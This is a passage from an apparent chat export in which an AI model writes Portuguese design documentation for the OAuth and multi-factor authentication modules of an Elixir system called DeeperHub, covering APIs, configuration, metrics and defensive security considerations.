        *   Se não encontrado, e auto-registro habilitado, cria uma nova conta DeeperHub e vincula a identidade OAuth.
        *   Armazena/Atualiza os tokens OAuth no `OAuthTokenSchema` (criptografados).
    *   **Criação de Sessão DeeperHub:** Se a conciliação for bem-sucedida (usuário DeeperHub identificado/criado):
        *   Chama `DeeperHub.Auth.SessionManager.create_session(...)`.
        *   Chama `DeeperHub.Auth.TokenService.generate_token_pair(...)`.
    *   Publica eventos (`account_linked`, `authentication_succeeded`) via `EventIntegration`.
    *   Audita a operação.
7.  **Resposta ao Cliente:** Retorna os tokens DeeperHub e informações do usuário para o frontend, que completa o login.

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.OAuth`)

*(Baseado na documentação original de `OAuthFacadeUnified` e `OAuthCompatibility`)*

### 6.1. `DeeperHub.OAuth.authorize_url(provider :: atom(), redirect_uri_key :: atom() | String.t(), session_state_data :: map()) :: {:ok, %{authorize_url: String.t(), state_param_for_session: String.t()}} | {:error, term()}`

*   **Descrição:** Gera a URL de autorização para o `provider` e um `state` para proteção CSRF.
*   **`redirect_uri_key`:** Uma chave que mapeia para uma `redirect_uri` configurada (para evitar que o cliente envie URIs arbitrárias).
*   **`session_state_data`:** Dados a serem incluídos no `state` ou associados a ele na sessão.
*   **Retorno:** URL para redirecionamento e o `state` que o cliente deve armazenar (ex: em cookie de sessão) para verificar no callback.

### 6.2. `DeeperHub.OAuth.authenticate_with_code(provider :: atom(), code :: String.t(), received_state :: String.t(), context :: map()) :: {:ok, AuthResponse.t()} | {:error, OAuthError.t()}`

*   **Descrição:** Processa o callback do provedor OAuth, troca o código por tokens, busca info do usuário e autentica/registra o usuário no DeeperHub.
*   **`context`:** `%{ip_address: String.t(), user_agent: String.t(), expected_state_from_session: String.t()}`.
*   **`AuthResponse.t()`:** `%{user: DeeperHub.Accounts.Schema.User.t(), deeper_hub_access_token: String.t(), deeper_hub_refresh_token: String.t(), provider_info: %{provider: atom(), provider_user_id: String.t()}}`.
*   **`OAuthError.t()`:** Ex: `:invalid_state`, `:token_exchange_failed`, `:user_info_fetch_failed`, `:account_linking_failed`, `:user_creation_disabled`.

### 6.3. `DeeperHub.OAuth.link_account(deeper_hub_user_id :: String.t(), provider :: atom(), provider_code :: String.t(), received_state :: String.t(), context :: map()) :: {:ok, OAuthToken.t()} | {:error, OAuthError.t()}` (Nova Sugestão)

*   **Descrição:** Permite que um usuário já logado no DeeperHub vincule uma nova conta OAuth. O fluxo é similar ao `authenticate_with_code` mas focado em vincular a uma conta existente.

### 6.4. `DeeperHub.OAuth.unlink_account(deeper_hub_user_id :: String.t(), provider :: atom()) :: :ok | {:error, :not_linked | term()}`

*   **Descrição:** Desvincula uma conta OAuth de um usuário DeeperHub.

### 6.5. `DeeperHub.OAuth.list_linked_accounts(deeper_hub_user_id :: String.t()) :: {:ok, list(LinkedAccountInfo.t())}`

*   **Descrição:** Lista as contas OAuth vinculadas a um usuário DeeperHub.
*   **`LinkedAccountInfo.t()`:** `%{provider: atom(), provider_user_id: String.t(), provider_email: String.t() | nil, linked_at: DateTime.t()}`.

### 6.6. `DeeperHub.OAuth.get_user_info_from_provider(provider :: atom(), access_token :: String.t()) :: {:ok, ProviderUserProfile.t()} | {:error, term()}` (Para uso interno ou admin)

*   **Descrição:** Busca informações do usuário diretamente do provedor usando um token de acesso OAuth válido.
*   **`ProviderUserProfile.t()`:** Mapa com dados do perfil do provedor.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager`:

*   **`[:oauth, :enabled_providers]`** (List de Atoms): Lista de provedores OAuth habilitados (ex: `[:google, :facebook, :github]`).
*   **Para cada provedor (ex: `[:oauth, :google, ...]`):**
    *   `... :client_id` (String)
    *   `... :client_secret` (String, DEVE ser de variável de ambiente ou cofre)
    *   `... :redirect_uris` (Map, ex: `%{default: \"https://app.deeperhub.com/oauth/google/callback\", mobile: \"myapp://oauth/google\"}`)
    *   `... :authorize_url` (String)
    *   `... :token_url` (String)
    *   `... :user_info_url` (String)
    *   `... :default_scopes` (List de Strings)
    *   `... :user_id_path` (List de Strings/Atoms): Caminho para extrair o ID do usuário do provedor da resposta userinfo (ex: `[:id]`).
    *   `... :user_email_path` (List de Strings/Atoms): Caminho para o email.
    *   `... :user_name_path` (List de Strings/Atoms): Caminho para o nome.
*   **`[:oauth, :auto_register_new_users]`** (Boolean): Se deve criar automaticamente contas DeeperHub para novos usuários OAuth. (Padrão: `true`)
*   **`[:oauth, :link_by_verified_email]`** (Boolean): Se deve tentar vincular automaticamente a uma conta DeeperHub existente se o email do provedor OAuth for verificado e corresponder. (Padrão: `true`)
*   **`[:oauth, :state_param_ttl_seconds]`** (Integer): TTL para o parâmetro `state` armazenado na sessão. (Padrão: `300`)
*   **`[:oauth, :user_info_cache_ttl_seconds]`** (Integer): TTL para o cache de perfis de usuário OAuth. (Padrão: `3600`)
*   **`[:oauth, :api_integration, :circuit_breaker, <provider_name>]`** (Map): Configs do Circuit Breaker para cada provedor.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.EventBus`, `Core.Logger`, `Core.Metrics`, `Core.Repo`, `Core.Cache`, `Core.HTTPClient`, `Core.EncryptionService`, `Core.CircuitBreaker`.
*   `DeeperHub.Accounts`: Para criar/encontrar/vincular usuários.
*   `DeeperHub.Auth`: Para criar sessões DeeperHub após autenticação OAuth.
*   `DeeperHub.Audit`: Para registrar eventos de vinculação/autenticação.

### 8.2. Bibliotecas Externas

*   `Assent` (altamente recomendado): Biblioteca Elixir popular para lidar com múltiplos provedores OAuth 2.0. Simplifica muito a implementação de `ProviderService`.
*   `Jason`: Para parsear respostas JSON dos provedores.
*   `HTTPoison` ou `Finch` (se não usar `Core.HTTPClient` que os encapsularia): Para fazer chamadas HTTP.

## 🤝 9. Como Usar / Integração

*   **Frontend/Cliente:**
    1.  Chamar um endpoint da API DeeperHub (ex: `/api/oauth/:provider/authorize`) que internamente chama `OAuth.authorize_url/3`.
    2.  A API DeeperHub retorna a `authorize_url` do provedor.
    3.  Frontend redireciona o usuário para essa URL.
    4.  Após o usuário autorizar, o provedor redireciona para a `redirect_uri` do DeeperHub (ex: `/api/oauth/:provider/callback`) com `code` e `state`.
    5.  O controller do callback no DeeperHub chama `OAuth.authenticate_with_code/4`.
    6.  Se bem-sucedido, a API DeeperHub retorna tokens DeeperHub para o frontend, que finaliza o login.
*   **Serviços Internos:** Podem usar `list_linked_accounts` ou `get_user_info_from_provider` (com cuidado e consentimento) para funcionalidades específicas.

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar o fluxo completo para cada provedor configurado usando mocks para as APIs dos provedores.
*   Testar a geração da `authorize_url` e a validação do `state`.
*   Testar a troca de código por token e a busca de userinfo.
*   Testar os cenários de usuário novo, usuário existente com conta não vinculada, e usuário existente com conta já vinculada.
*   Testar a lógica de desvinculação.
*   Testar o funcionamento do `UserInfoCache`.
*   Testar o Circuit Breaker para chamadas a APIs de provedores.
*   Localização: `test/deeper_hub/oauth/`.

### 10.2. Métricas

*   `deeper_hub.oauth.authentication.attempts.count` (tags: `provider`, `status` (`success`, `failure`))
*   `deeper_hub.oauth.authentication.duration_ms` (Histograma, tags: `provider`, `stage` (`code_exchange`, `user_info_fetch`))
*   `deeper_hub.oauth.accounts_linked.count` (tags: `provider`)
*   `deeper_hub.oauth.accounts_unlinked.count` (tags: `provider`)
*   `deeper_hub.oauth.user_info_cache.hit_ratio.gauge` (Gauge)
*   `deeper_hub.oauth.api_call.failure.count` (tags: `provider`, `endpoint_type` (`token`, `userinfo`)) (relacionado ao Circuit Breaker)

### 10.3. Logs

*   **Nível INFO:** Início e fim de um fluxo OAuth. Conta vinculada/desvinculada. Tokens trocados/atualizados.
*   **Nível WARNING:** Falha na validação do `state`. Falha na troca de código ou busca de userinfo (antes de retentativas do Circuit Breaker).
*   **Nível ERROR:** Falha persistente na comunicação com o provedor OAuth. Erro ao criar/vincular conta DeeperHub após autenticação OAuth.

### 10.4. Telemetria

*   `[:deeper_hub, :oauth, :authorize_url_generated]`
    *   Metadados: `%{provider: provider, redirect_uri_key: key}`
*   `[:deeper_hub, :oauth, :callback_received]`
    *   Metadados: `%{provider: provider, state_valid: boolean}`
*   `[:deeper_hub, :oauth, :token_exchange, :start | :stop | :exception]`
    *   Metadados: `%{provider: provider}`
*   `[:deeper_hub, :oauth, :user_info_fetch, :start | :stop | :exception]`
    *   Metadados: `%{provider: provider, from_cache: boolean}`
*   `[:deeper_hub, :oauth, :account_reconciliation, :stop]`
    *   Metadados: `%{provider: provider, action_taken: :linked_new | :linked_existing | :created_new_deeper_hub_user | :login_existing}`

## ❌ 11. Tratamento de Erros

*   Falhas na comunicação com provedores externos devem ser tratadas pelo `OAuthApiIntegration` (com Circuit Breaker), retornando erros claros para o `OAuthService`.
*   O `state` inválido no callback deve resultar em erro e impedir o prosseguimento.
*   Se o email de um usuário OAuth já existir em uma conta DeeperHub diferente e a vinculação automática não for clara, o usuário pode precisar ser guiado por um fluxo de \"conflito de contas\".

## 🛡️ 12. Considerações de Segurança

*   **Validação do `state`:** Essencial para prevenir CSRF no fluxo OAuth.
*   **Validação de `redirect_uri`:** O DeeperHub deve validar que a `redirect_uri` usada pelo provedor é uma das URIs pré-registradas e permitidas para evitar que códigos de autorização sejam enviados para endpoints maliciosos.
*   **Armazenamento Seguro de `client_secret`:** Tratar como um segredo de alta importância.
*   **Armazenamento Seguro de Tokens de Usuário:** Tokens de acesso e refresh OAuth de usuários devem ser criptografados em repouso.
*   **Escopos Mínimos:** Solicitar apenas os escopos estritamente necessários dos provedores OAuth.
*   **Atualização de Tokens:** Implementar corretamente o fluxo de atualização de tokens de acesso usando tokens de refresh para evitar que o usuário precise reautorizar frequentemente.
*   **Revogação de Tokens:** Quando um usuário desvincula uma conta ou sua conta DeeperHub é encerrada, os tokens OAuth associados devem ser revogados no lado do provedor, se a API do provedor permitir.

## 🧑‍💻 13. Contribuição

*   Ao adicionar um novo provedor OAuth:
    *   Registrar as configurações (client_id, secret, endpoints, escopos) no `ConfigManager`.
    *   Adicionar lógica específica do provedor no `ProviderService` (ou usar uma estratégia de `Assent`).
    *   Mapear os campos do perfil do usuário do provedor para o formato interno do DeeperHub.
    *   Testar o fluxo completo.
*   Manter as bibliotecas cliente OAuth (como Assent) atualizadas.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar o fluxo de revogação de tokens do lado do provedor quando uma conta é desvinculada.
*   [ ] Permitir que usuários vejam e gerenciem quais dados e permissões foram concedidos a cada provedor vinculado.
*   [ ] Suporte para OpenID Connect (OIDC) sobre OAuth 2.0 para um fluxo de autenticação mais padronizado.
*   [ ] Adicionar um fluxo para lidar com \"account linking conflicts\" de forma mais interativa com o usuário.
*   [ ] Permitir que administradores configurem dinamicamente novos provedores OAuth através de uma UI (armazenando client_id/secret de forma segura).

---

*Última atualização: 2025-05-12*

---

OAuth é um fluxo complexo com muitas partes móveis, mas essencial para a experiência moderna de login.

O que vem agora? Podemos detalhar o `DeeperHub.MFA` (Autenticação Multifator), que é outra peça chave do `Auth`, ou talvez o `DeeperHub.Webhooks` para variar um pouco?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ótimo! Vamos prosseguir com o `DeeperHub.MFA` (Autenticação Multifator). Este é um componente de segurança cada vez mais indispensável para proteger contas de usuário.

---

# Módulo: `DeeperHub.MFA` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.MFA`

O módulo `DeeperHub.MFA` é responsável por gerenciar e aplicar a **Autenticação Multifator (MFA)**, também conhecida como autenticação de dois fatores (2FA), para os usuários do sistema DeeperHub. O MFA adiciona uma camada extra de segurança ao processo de login, exigindo que o usuário forneça duas ou mais formas de verificação de identidade antes de conceder acesso.

Este módulo suporta diversos métodos MFA, como:
*   **TOTP (Time-based One-Time Password):** Usando aplicativos autenticadores como Google Authenticator, Authy, etc.
*   **WebAuthn (FIDO2):** Usando chaves de segurança físicas, biometria em dispositivos compatíveis (integrado com `DeeperHub.WebAuthn`).
*   **Códigos de Recuperação:** Códigos de uso único para acesso em caso de perda de outros métodos.
*   **Notificações Push (Opcional):** Aprovação de login via notificação em um dispositivo móvel registrado.
*   **SMS/Email OTP (Opcional, menos seguro):** Envio de códigos de uso único por SMS ou email.

O objetivo é dificultar significativamente o acesso não autorizado a contas, mesmo que a senha principal do usuário seja comprometida. 😊

*(Nota: A documentação original tem `DeeperHub.MFA.Adapters.DefaultMFAService`, `MFAAdapter`, `MFABehaviour`, `Integrations`, `Schema`, `Services` como `TOTPService`, `WebAuthnService` (que delega para `DeeperHub.WebAuthn`), `RecoveryCodeService`, `PushVerificationService`, e `MFAPolicyService`. Esta documentação consolida sob a fachada `DeeperHub.MFA` e organiza os componentes internos.)*

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Gerenciamento de Métodos MFA por Usuário:**
    *   Permitir que usuários registrem (configurem) múltiplos métodos MFA (`setup_method/3`).
    *   Listar os métodos MFA configurados por um usuário (`list_methods/1`).
    *   Permitir que usuários removam métodos MFA configurados (`remove_method/3`).
    *   Verificar se um método específico está ativo para um usuário (`is_method_active?/2`).
*   **Verificação de Código/Fator MFA:**
    *   Verificar códigos TOTP (`verify_code/3` para TOTP).
    *   Processar e verificar asserções WebAuthn (delegado para `DeeperHub.WebAuthn`).
    *   Verificar códigos de recuperação (`verify_recovery_code/2`).
    *   Processar respostas de notificações push (`PushVerificationService.process_verification_response/3`).
    *   Verificar códigos OTP enviados por email/SMS (se implementado).
*   **Geração de Códigos e Desafios:**
    *   Gerar segredos TOTP e URIs de configuração.
    *   Gerar desafios para WebAuthn (delegado para `DeeperHub.WebAuthn`).
    *   Gerar um conjunto de códigos de recuperação únicos (`generate_recovery_codes/2`).
    *   Gerar e enviar códigos OTP para email/SMS (`send_code/4`).
*   **Gerenciamento de Preferências MFA do Usuário:**
    *   Permitir que usuários definam um método MFA preferencial.
    *   Armazenar e consultar preferências (`get_user_preferences/1`, `update_user_preferences/2`).
*   **Políticas de MFA (`Services.MFAPolicyService`):**
    *   Determinar quando o MFA é obrigatório para um usuário ou operação (`requires_mfa?/2`).
    *   Gerenciar períodos de carência para configuração de MFA.
    *   Rastrear se uma sessão atual já passou por uma verificação MFA recente (`has_recent_verification?/2`).
*   **Proteção contra Força Bruta em Verificações MFA:**
    *   Limitar o número de tentativas falhas de verificação de código.
*   **Observabilidade e Auditoria:**
    *   Registrar logs e métricas para todas as operações MFA.
    *   Auditar a configuração, remoção e uso de métodos MFA.
*   **Integração com o Fluxo de Login (`DeeperHub.Auth`):**
    *   Ser chamado pelo `AuthService` quando MFA é necessário após a autenticação primária.
*   **Interface para \"Step-up Authentication\":**
    *   Permitir que operações de alto risco exijam uma nova verificação MFA, mesmo que o usuário já esteja logado.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.MFA` (Fachada Pública, ex-`MFAFacade`):**
    *   Ponto de entrada para todas as funcionalidades MFA.
    *   Delega para o `MFAService` ou diretamente para serviços de métodos específicos.
2.  **`DeeperHub.MFA.Services.MFAService` (ou `DefaultMFAService` - GenServer/Coordenador):**
    *   **Responsabilidade:** Orquestra as operações MFA.
    *   **Interações:**
        *   `TOTPService`, `RecoveryCodeService`, `PushVerificationService`.
        *   `DeeperHub.WebAuthn` (para operações WebAuthn).
        *   `MFAPolicyService`: Para verificar se MFA é mandatório.
        *   `DeeperHub.Core.Repo` (via schemas): Para persistir configurações MFA do usuário.
        *   `DeeperHub.Notifications`: Para enviar códigos OTP ou notificações sobre MFA.
        *   `DeeperHub.Core.ConfigManager`: Para configurações.
        *   `DeeperHub.Security.BruteForceProtection`: Para limitar tentativas de verificação.
3.  **Serviços por Método MFA:**
    *   **`DeeperHub.MFA.Services.TOTPService`:** Lógica para setup e verificação de TOTP. Usa `DeeperHub.MFA.TOTP` schema.
    *   **`DeeperHub.MFA.Services.RecoveryCodeService`:** Lógica para geração, armazenamento (hashes) e verificação de códigos de recuperação. Usa `DeeperHub.MFA.RecoveryCode` schema.
    *   **`DeeperHub.MFA.Services.PushVerificationService`:** Lógica para gerenciar registro de dispositivos push e o fluxo de verificação via push. Usa `DeeperHub.MFA.Schema.PushDevice`.
    *   *(`WebAuthnService` está em `DeeperHub.WebAuthn` mas é usado como um método MFA)*.
4.  **`DeeperHub.MFA.Services.MFAPolicyService`:**
    *   Determina se MFA é necessário para um usuário/operação e gerencia o estado de verificação MFA recente na sessão.
5.  **Schemas Ecto:**
    *   `DeeperHub.MFA.TOTP`: Armazena segredo TOTP (criptografado), status.
    *   `DeeperHub.MFA.RecoveryCode`: Armazena hashes dos códigos de recuperação e seu status de uso.
    *   `DeeperHub.MFA.Schema.PushDevice`: Armazena tokens de dispositivos para notificações push.
    *   `DeeperHub.MFA.Schema.UserMFAPreferences` (Novo Sugerido): Armazena o método preferido do usuário, se o MFA está habilitado por ele, etc.
6.  **Integrações (`AuditIntegration`, `EventIntegration`, `MFAAnomalyIntegration`, `MFANotificationIntegration`):**
    *   Para auditoria, eventos de domínio, análise de anomalias e notificações específicas de MFA.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/mfa/
├── mfa.ex                              # Fachada Pública
│
├── services/
│   ├── mfa_service.ex                  # Serviço orquestrador principal
│   ├── totp_service.ex
│   ├── recovery_code_service.ex
│   ├── push_verification_service.ex
│   └── mfa_policy_service.ex
│
├── schemas/                            # (Ou schema/ singular)
│   ├── totp.ex
│   ├── recovery_code.ex
│   ├── push_device.ex
│   └── user_mfa_preferences.ex       # Novo
│
├── integrations/
│   ├── audit_integration.ex
│   ├── event_integration.ex
│   ├── mfa_anomaly_integration.ex
│   └── mfa_notification_integration.ex
│
├── supervisor.ex
└── telemetry.ex
```
*(O `DeeperHub.WebAuthn` seria um módulo irmão, mas conceitualmente um método MFA)*

### 3.3. Decisões de Design Importantes

*   **Segurança dos Segredos MFA:** Segredos TOTP e outros dados sensíveis de MFA devem ser criptografados em repouso (`Core.EncryptionService`).
*   **Experiência do Usuário:** O fluxo de configuração e uso de MFA deve ser o mais simples e intuitivo possível.
*   **Códigos de Recuperação:** Sempre fornecer códigos de recuperação ao habilitar MFA, pois são cruciais se o usuário perder acesso ao seu dispositivo MFA principal.
*   **Múltiplos Métodos:** Permitir que os usuários configurem múltiplos métodos MFA aumenta a resiliência.
*   **Rate Limiting em Verificações:** Proteger contra a adivinhação de códigos TOTP ou OTPs.

## 🛠️ 4. Casos de Uso Principais

*   **Usuário Habilita TOTP:**
    *   Usuário navega para configurações de segurança e escolhe adicionar TOTP.
    *   `MFA.setup_method(user_id, :totp)` é chamado.
    *   `TOTPService` gera um segredo, cria um QR code URI.
    *   Usuário escaneia com seu app autenticador e insere o primeiro código para confirmar.
    *   `MFA.verify_code(user_id, totp_code, %{method: :totp, context: :setup_confirmation})` é chamado.
    *   Se válido, TOTP é marcado como ativo para o usuário. Códigos de recuperação são gerados e exibidos.
*   **Login com MFA:**
    *   `DeeperHub.Auth` determina que MFA é necessário após a senha.
    *   Frontend solicita ao usuário seu método MFA preferido ou o próximo fator.
    *   Usuário insere código TOTP.
    *   Frontend envia para `DeeperHub.Auth.verify_second_factor(user_id, :totp, code, context)`.
    *   `Auth` delega para `MFA.verify_code(user_id, code, %{method: :totp, context: :login})`.
    *   Se válido, login prossegue; senão, erro.
*   **Usuário Perde Dispositivo TOTP e Usa Código de Recuperação:**
    *   No fluxo de login, após a senha, usuário escolhe \"Usar código de recuperação\".
    *   Insere um de seus códigos.
    *   `MFA.verify_recovery_code(user_id, recovery_code)` é chamado.
    *   Se válido, o código é marcado como usado, e o login prossegue. O sistema deve incentivar o usuário a configurar um novo método MFA e gerar novos códigos de recuperação.

## 🌊 5. Fluxos Importantes

### Fluxo de Configuração de Novo Método MFA (Ex: TOTP)

1.  **Usuário (UI):** Inicia o processo de adicionar TOTP.
2.  **Frontend -> Backend API Controller:** Chama um endpoint que leva a `DeeperHub.MFA.setup_method(user_id, :totp, %{issuer_name: \"DeeperHub\"})`.
3.  **`MFAService` (ou `TOTPService` diretamente):**
    *   Gera um novo segredo TOTP (ex: 160 bits de aleatoriedade).
    *   Cria uma URI `otpauth://` contendo o segredo, nome do emissor, e email/username do usuário.
    *   Armazena temporariamente o segredo (ou um hash dele) associado ao `user_id` e um status \"pendente de verificação\".
    *   Retorna a URI (para QR code) e o segredo em formato texto (para entrada manual) para o frontend.
4.  **Frontend:** Exibe o QR code e o campo para o usuário inserir o primeiro código TOTP gerado pelo seu app autenticador.
5.  **Usuário (UI):** Escaneia o QR code, vê o código no app, e o insere na UI.
6.  **Frontend -> Backend API Controller:** Chama um endpoint que leva a `DeeperHub.MFA.verify_code(user_id, submitted_totp_code, %{method: :totp, context: :setup_confirmation})`.
7.  **`MFAService` (ou `TOTPService`):**
    *   Recupera o segredo TOTP pendente para o `user_id`.
    *   Valida o `submitted_totp_code` contra o segredo (considerando janelas de tempo).
    *   **Se Válido:**
        *   Marca o método TOTP como ativo para o usuário (persiste o segredo criptografado).
        *   Chama `RecoveryCodeService.generate_and_store(user_id, default_count)` para gerar códigos de recuperação.
        *   Retorna `{:ok, %{recovery_codes: [...]}}` (ou apenas `:ok` e o frontend busca os códigos depois).
        *   Publica evento `mfa_method_added`. Audita.
    *   **Se Inválido:** Retorna erro, incrementa contador de falhas (para brute force).

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.MFA`)

*(Baseado na documentação original de `MFAFacade` e serviços relacionados)*

### 6.1. `DeeperHub.MFA.setup_method(user_id :: String.t(), method :: :totp | :webauthn | :push | :sms_otp, details :: map() | nil) :: {:ok, SetupData.t()} | {:error, term()}`

*   **Descrição:** Inicia o processo de configuração para um novo método MFA.
*   **`details`:** Específico do método (ex: para `:totp`, `%{issuer_name: \"MyApp\"}`; para `:push`, `%{device_name: \"My iPhone\"}`).
*   **`SetupData.t()`:** Varia por método.
    *   Para `:totp`: `%{secret_key: String.t(), otpauth_uri: String.t()}`.
    *   Para `:webauthn`: Opções de registro do `DeeperHub.WebAuthn.start_registration`.
    *   Para `:push`: Confirmação do registro do dispositivo.

### 6.2. `DeeperHub.MFA.verify_code(user_id :: String.t(), code :: String.t(), verification_context :: map()) :: {:ok, :verified} | {:error, :invalid_code | :max_attempts_reached | term()}`

*   **Descrição:** Verifica um código MFA (TOTP, SMS OTP, ou um token de contexto de uma verificação push/webauthn já iniciada).
*   **`verification_context`:** `%{method: :totp | :sms_otp, operation: :login | :setup_confirmation | :critical_action, ...}`.

### 6.3. `DeeperHub.MFA.generate_recovery_codes(user_id :: String.t(), opts :: keyword()) :: {:ok, list(String.t())} | {:error, term()}`

*   **Descrição:** Gera um novo conjunto de códigos de recuperação, invalidando os antigos.
*   **`opts`:** `:count` (integer, Padrão: `10`).

### 6.4. `DeeperHub.MFA.verify_recovery_code(user_id :: String.t(), recovery_code :: String.t()) :: {:ok, :verified} | {:error, :invalid_code | :code_already_used | term()}`

*   **Descrição:** Verifica um código de recuperação. Se válido, marca-o como usado.

### 6.5. `DeeperHub.MFA.list_user_methods(user_id :: String.t()) :: {:ok, list(MethodInfo.t())}`

*   **Descrição:** Lista os métodos MFA configurados e ativos para um usuário.
*   **`MethodInfo.t()`:** `%{method_type: :totp | :webauthn | :push | :recovery_codes_active, id: String.t() | nil, name: String.t() | nil, added_at: DateTime.t()}`.

### 6.6. `DeeperHub.MFA.remove_method(user_id :: String.t(), method_type :: atom(), method_id :: String.t() | nil, verification_code_or_password :: String.t()) :: :ok | {:error, term()}`

*   **Descrição:** Remove um método MFA configurado. Requer verificação (senha ou outro fator MFA) para segurança.
*   **`method_id`:** Necessário para WebAuthn (ID da credencial) ou Push (ID do dispositivo).

### 6.7. `DeeperHub.MFA.get_user_mfa_preferences(user_id :: String.t()) :: {:ok, UserMFAPreferences.t()}`

*   **Descrição:** Obtém as preferências MFA do usuário (ex: método preferido, se MFA está habilitado por ele).

### 6.8. `DeeperHub.MFA.update_user_mfa_preferences(user_id :: String.t(), preferences :: map()) :: {:ok, UserMFAPreferences.t()} | {:error, Ecto.Changeset.t()}`

*   **Descrição:** Atualiza as preferências MFA do usuário.

### 6.9. `DeeperHub.MFA.Services.MFAPolicyService` (Funções expostas via `MFA` ou chamadas internamente por `Auth`):

*   `requires_mfa?(user_id, operation_context)`
*   `has_recent_mfa_verification?(user_id, session_id, operation_context)`
*   `register_mfa_verification_in_session(session_id, user_id, method_used)`

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager` e `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:mfa, :enabled]`** (Boolean): Habilita/desabilita o sistema MFA globalmente. (Padrão: `true`)
*   **`[:mfa, :allowed_methods]`** (List de Atoms): Métodos MFA suportados e permitidos no sistema (ex: `[:totp, :webauthn, :recovery_code, :push]`).
*   **`[:mfa, :policy, :require_mfa_for_roles]`** (List de Strings): Papéis de usuário que sempre exigem MFA. (Ex: `[\"admin\", \"moderator\"]`).
*   **`[:mfa, :policy, :grace_period_days_for_new_users]`** (Integer | nil): Período para novos usuários configurarem MFA.
*   **`[:mfa, :policy, :session_mfa_validity_seconds]`** (Integer): Por quanto tempo uma verificação MFA na sessão é considerada válida para pular verificações subsequentes (step-up).
*   **`[:mfa, :totp, :issuer_name]`** (String): Nome do emissor exibido em apps autenticadores. (Padrão: \"DeeperHub\")
*   **`[:mfa, :totp, :secret_length_bytes]`** (Integer): Comprimento do segredo TOTP.
*   **`[:mfa, :totp, :verification_window]`** (Integer): Quantos códigos passados/futuros são válidos. (Padrão: `1` - ou seja, atual, anterior e próximo).
*   **`[:mfa, :recovery_code, :default_count]`** (Integer): Número de códigos de recuperação gerados. (Padrão: `10`)
*   **`[:mfa, :recovery_code, :hash_algorithm]`** (Atom): Algoritmo para hashear códigos de recuperação.
*   **`[:mfa, :push_verification, :default_timeout_seconds]`** (Integer).
*   **`[:mfa, :brute_force, :max_verify_attempts]`** (Integer): Tentativas de verificação de código antes de bloqueio/delay.
*   **`[:mfa, :brute_force, :lockout_duration_seconds]`** (Integer).

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.*`: Todos os módulos Core.
*   `DeeperHub.Auth`: Para integrar no fluxo de login e obter informações do usuário.
*   `DeeperHub.Accounts`: Para dados do usuário.
*   `DeeperHub.WebAuthn`: Para a funcionalidade WebAuthn.
*   `DeeperHub.Notifications`: Para enviar códigos OTP por email/SMS e notificações sobre MFA.
*   `DeeperHub.Security.BruteForceProtection`: Para proteger contra adivinhação de códigos.
*   `DeeperHub.Core.EncryptionService`: Para criptografar segredos TOTP.

### 8.2. Bibliotecas Externas

*   `ex_totp` (ou similar): Para lógica TOTP.
*   Bibliotecas para WebAuthn (se não usar a interna `DeeperHub.WebAuthn`).
*   Bibliotecas cliente para serviços de SMS/Push (se esses canais forem implementados).

## 🤝 9. Como Usar / Integração

*   **Fluxo de Login (`DeeperHub.Auth`):**
    *   Após a senha ser verificada, `AuthService` chama `MFAPolicyService.requires_mfa?`.
    *   Se `true`, `AuthService` retorna `{:error, :mfa_required, ...}`.
    *   O frontend guia o usuário pelo fluxo MFA, chamando os endpoints da API MFA (que usam `DeeperHub.MFA` fachada).
*   **Configurações de Segurança do Usuário (UI):**
    *   Permitir que o usuário liste, adicione e remova métodos MFA usando os endpoints da API MFA.
*   **Step-up Authentication:**
    *   Antes de uma operação crítica, um serviço pode chamar `MFAPolicyService.requires_mfa?(user_id, %{operation: :delete_account, session_mfa_verified: session.mfa_verified_at})`.
    *   Se `true`, redirecionar para verificação MFA.

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar o fluxo de setup e verificação para cada método MFA suportado (TOTP, Recovery Code, WebAuthn, Push).
*   Testar a lógica de `MFAPolicyService` (quando MFA é obrigatório, validade da sessão MFA).
*   Testar a geração e invalidação de códigos de recuperação.
*   Testar a remoção de métodos e o impacto no status MFA do usuário.
*   Testar a proteção contra força bruta nas verificações de código.
*   Localização: `test/deeper_hub/mfa/`.

### 10.2. Métricas

*   `deeper_hub.mfa.setup_attempt.count` (tags: `method`, `status` (`success`, `failure`))
*   `deeper_hub.mfa.verification_attempt.count` (tags: `method`, `context` (`login`, `step_up`), `status` (`success`, `failure`))
*   `deeper_hub.mfa.users_with_mfa_enabled.gauge` (Gauge, tags: `method_count` (`one_method`, `multi_method`))
*   `deeper_hub.mfa.recovery_codes_used.count`
*   `deeper_hub.mfa.method_removed.count` (tags: `method`)

### 10.3. Logs

*   **Nível INFO:** Método MFA configurado/removido. Verificação MFA bem-sucedida.
*   **Nível WARNING:** Tentativa de verificação MFA falhou. Usuário usou código de recuperação.
*   **Nível ERROR:** Falha crítica no setup de MFA. Erro ao enviar código OTP.

### 10.4. Telemetria

*   `[:deeper_hub, :mfa, :setup, :start | :stop | :exception]`
    *   Metadados: `%{user_id: id, method: method}`
*   `[:deeper_hub, :mfa, :verify, :start | :stop | :exception]`
    *   Metadados: `%{user_id: id, method: method, context: context, result: :success | :failure}`
*   `[:deeper_hub, :mfa, :policy_check]`
    *   Metadados: `%{user_id: id, operation: op, result_requires_mfa: boolean}`

## ❌ 11. Tratamento de Erros

*   Falhas na verificação de código devem retornar erros claros (código inválido, expirado, máximo de tentativas).
*   Problemas com serviços externos (ex: envio de SMS) devem ser tratados com retentativas e fallbacks (ex: sugerir outro método MFA).
*   Se o usuário perder todos os seus métodos MFA e códigos de recuperação, um processo de recuperação de conta manual e seguro (via suporte) deve existir.

## 🛡️ 12. Considerações de Segurança

*   **Segurança dos Segredos TOTP:** Devem ser criptografados em repouso.
